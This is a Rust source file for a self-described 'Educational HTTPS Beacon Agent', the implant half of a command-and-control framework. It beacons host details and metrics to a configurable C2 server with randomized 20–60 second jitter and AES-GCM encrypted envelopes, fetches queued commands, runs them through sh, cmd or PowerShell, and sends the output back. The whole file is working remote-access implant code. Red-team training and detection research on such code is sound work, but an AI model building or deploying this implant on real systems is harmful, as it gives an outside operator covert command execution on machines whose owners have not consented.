use reqwest::Client;
use serde::{Deserialize, Serialize};
use serde_json::json;
use uuid::Uuid;
use std::fs;
use std::time::Duration;
use tokio::time::sleep;
use rand::Rng;
use std::process::Command;
use sysinfo::System;

mod system_info;
mod auth;
mod crypto;

#[derive(Serialize)]
struct BeaconPayload {
    id: String,
    status: String,
    hostname: String,
    os: String,
    cpu_usage: f64,
    memory_usage: f64,
    disk_usage: f64,
}

#[derive(Serialize)]
struct EncryptedEnvelope {
    payload: String,
}

#[derive(Deserialize)]
struct EncryptedResponse {
    payload: String,
}

#[derive(Deserialize)]
struct BeaconResponse {
    success: bool,
    timestamp: String,
    commands: Vec<PendingCommand>,
}

#[derive(Deserialize, Clone)]
struct PendingCommand {
    id: String,
    command_type: String,
    payload: String,
}

#[tokio::main]
async fn main() {
    println!("Educational HTTPS Beacon Agent starting...");

    let agent_id = get_or_create_agent_id();
    println!("Agent ID: {}", agent_id);

    let hostname = system_info::get_hostname();
    let os = system_info::get_os_name();
    println!("Host: {}, OS: {}", hostname, os);

    let server_url = std::env::var("C2_SERVER_URL")
        .unwrap_or_else(|_| "http://localhost:3000".to_string());

    let auth_token = auth::compute_agent_token(&agent_id);
    let psk = auth::get_psk();

    println!("Beacon server: {}", server_url);
    println!("Starting beacon loop with 20-60s jitter (AES-GCM encrypted)...");

    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .expect("Failed to create HTTP client");

    let mut sys = System::new_all();

    loop {
        let jitter = rand::thread_rng().gen_range(20..=60);

        let metrics = system_info::get_system_metrics(&mut sys);
        let payload = BeaconPayload {
            id: agent_id.clone(),
            status: "alive".to_string(),
            hostname: hostname.clone(),
            os: os.clone(),
            cpu_usage: metrics.cpu_usage,
            memory_usage: metrics.memory_usage,
            disk_usage: metrics.disk_usage,
        };

        let payload_bytes = serde_json::to_vec(&payload).expect("serialize beacon");
        let encrypted = match crypto::encrypt(&payload_bytes, &psk) {
            Ok(e) => e,
            Err(e) => {
                eprintln!("Encryption failed: {}", e);
                sleep(Duration::from_secs(jitter)).await;
                continue;
            }
        };

        let beacon_url = format!("{}/api/beacon", server_url);
        match client
            .post(&beacon_url)
            .header("Authorization", format!("Bearer {}", auth_token))
            .json(&EncryptedEnvelope { payload: encrypted })
            .send()
            .await
        {
            Ok(response) => {
                if response.status().is_success() {
                    match response.json::<EncryptedResponse>().await {
                        Ok(envelope) => {
                            match crypto::decrypt(&envelope.payload, &psk) {
                                Ok(plaintext) => {
                                    match serde_json::from_slice::<BeaconResponse>(&plaintext) {
                                        Ok(beacon_resp) => {
                                            if beacon_resp.success {
                                                println!(
                                                    "Beacon accepted at {} (cpu {:.1}%, mem {:.1}%)",
                                                    beacon_resp.timestamp,
                                                    metrics.cpu_usage,
                                                    metrics.memory_usage
                                                );
                                                for cmd in beacon_resp.commands {
                                                    println!(
                                                        "Received command {}: {}",
                                                        cmd.id, cmd.command_type
                                                    );
                                                    execute_command(
                                                        &client,
                                                        &server_url,
                                                        &agent_id,
                                                        &auth_token,
                                                        &psk,
                                                        cmd,
                                                    )
                                                    .await;
                                                }
                                            }
                                        }
                                        Err(e) => eprintln!("Failed to parse beacon response: {}", e),
                                    }
                                }
                                Err(e) => eprintln!("Failed to decrypt response: {}", e),
                            }
                        }
                        Err(e) => eprintln!("Failed to read response envelope: {}", e),
                    }
                } else {
                    eprintln!("Beacon rejected: HTTP {}", response.status());
                }
            }
            Err(e) => eprintln!("Beacon failed: {}", e),
        }

        println!("Sleeping for {} seconds before next beacon...", jitter);
        sleep(Duration::from_secs(jitter)).await;
    }
}

async fn execute_command(
    client: &Client,
    server_url: &str,
    agent_id: &str,
    auth_token: &str,
    psk: &str,
    cmd: PendingCommand,
) {
    println!("Executing command {}: {}", cmd.id, cmd.payload);

    let output = match cmd.command_type.as_str() {
        "shell" | "bash" | "cmd" => execute_shell(&cmd.payload),
        "powershell" => execute_powershell(&cmd.payload),
        _ => format!("Unknown command type: {}", cmd.command_type),
    };

    let preview = if output.len() > 100 {
        &output[..100]
    } else {
        &output
    };
    println!("Command {} output (first 100 chars): {}", cmd.id, preview);

    let result_payload = json!({
        "agent_id": agent_id,
        "command_id": cmd.id,
        "output": output,
        "status": "completed"
    });

    let payload_bytes = serde_json::to_vec(&result_payload).expect("serialize result");
    let encrypted = match crypto::encrypt(&payload_bytes, psk) {
        Ok(e) => e,
        Err(e) => {
            eprintln!("Failed to encrypt result: {}", e);
            return;
        }
    };

    let result_url = format!("{}/api/result", server_url);
    match client
        .post(&result_url)
        .header("Authorization", format!("Bearer {}", auth_token))
        .json(&EncryptedEnvelope { payload: encrypted })
        .send()
        .await
    {
        Ok(resp) => {
            if resp.status().is_success() {
                println!("Result for command {} sent successfully", cmd.id);
            } else {
                eprintln!("Failed to send result: HTTP {}", resp.status());
            }
        }
        Err(e) => eprintln!("Failed to send result: {}", e),
    }
}

fn execute_shell(command: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd").args(["/C", command]).output()
    } else {
        Command::new("sh").args(["-c", command]).output()
    };

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            let exit_code = out.status.code().unwrap_or(-1);
            format!(
                "Exit code: {}\n\nSTDOUT:\n{}\n\nSTDERR:\n{}",
                exit_code, stdout, stderr
            )
        }
        Err(e) => format!("Failed to execute command: {}", e),
    }
}

fn execute_powershell(command: &str) -> String {
    let output = Command::new("powershell")
        .args(["-Command", command])
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            format!("STDOUT:\n{}\n\nSTDERR:\n{}", stdout, stderr)
        }
        Err(e) => format!("Failed to execute PowerShell: {}", e),
    }
}

fn get_or_create_agent_id() -> String {
    let id_file = "agent_id.txt";
    if let Ok(id) = fs::read_to_string(id_file) {
        let trimmed = id.trim();
        if !trimmed.is_empty() {
            return trimmed.to_string();
        }
    }
    let new_id = Uuid::new_v4().to_string();
    let _ = fs::write(id_file, &new_id);
    new_id
}
